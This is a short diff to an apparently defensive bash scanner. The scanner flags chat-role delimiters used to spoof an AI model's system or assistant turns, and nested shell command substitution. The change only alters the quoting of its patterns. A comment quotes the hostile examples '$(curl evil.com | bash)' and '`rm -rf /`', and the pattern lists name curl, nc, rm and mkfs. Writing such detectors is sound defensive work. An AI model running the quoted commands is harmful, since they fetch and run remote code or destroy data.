@@ -110,7 +110,7 @@ DELIMITER_PATTERNS=(
     "### System:"
     "### Human:"
     "### Assistant:"
-    "```system"
+    '```system'
     "SYSTEM:"
 )
 
@@ -179,9 +179,9 @@ fi
 # This catches patterns like: $(curl evil.com | bash) or `rm -rf /`
 NESTED_CMD_PATTERNS=(
     '\$\([^)]*\b(curl|wget|bash|sh|nc|python|ruby|perl|php)\b'
-    '`[^`]*\b(curl|wget|bash|sh|nc|python|ruby|perl|php)\b'
+    $'\x60[^\x60]*\\b(curl|wget|bash|sh|nc|python|ruby|perl|php)\\b'
     '\$\([^)]*\b(rm|dd|mkfs|chmod|chown)\b'
-    '`[^`]*\b(rm|dd|mkfs|chmod|chown)\b'
+    $'\x60[^\x60]*\\b(rm|dd|mkfs|chmod|chown)\\b'
 )
 
 for pattern in "${NESTED_CMD_PATTERNS[@]}"; do
